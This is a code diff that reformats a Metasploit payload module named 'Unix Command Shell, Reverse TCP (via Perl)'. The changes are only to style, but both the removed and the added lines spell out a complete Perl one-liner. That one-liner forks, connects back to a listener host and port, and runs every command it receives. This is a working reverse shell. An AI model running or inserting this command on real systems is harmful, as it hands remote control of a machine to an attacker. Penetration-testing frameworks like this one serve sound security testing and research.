@@ -3,32 +3,32 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 234
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Reverse TCP (via Perl)',
-      'Description'   => 'Creates an interactive shell via perl',
-      'Author'        => 'cazz',
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'perl',
-      'Payload'       =>
-        {
-          'Offsets' => { },
+    super(
+      merge_info(
+        info,
+        'Name' => 'Unix Command Shell, Reverse TCP (via Perl)',
+        'Description' => 'Creates an interactive shell via perl',
+        'Author' => 'cazz',
+        'License' => BSD_LICENSE,
+        'Platform' => 'unix',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'RequiredCmd' => 'perl',
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
         }
-      ))
+      )
+    )
   end
 
   #
@@ -44,8 +44,8 @@ module MetasploitModule
   #
   def command_string
     lhost = datastore['LHOST']
-    ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
+    ver = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    cmd   = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
+    cmd = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
   end
 end
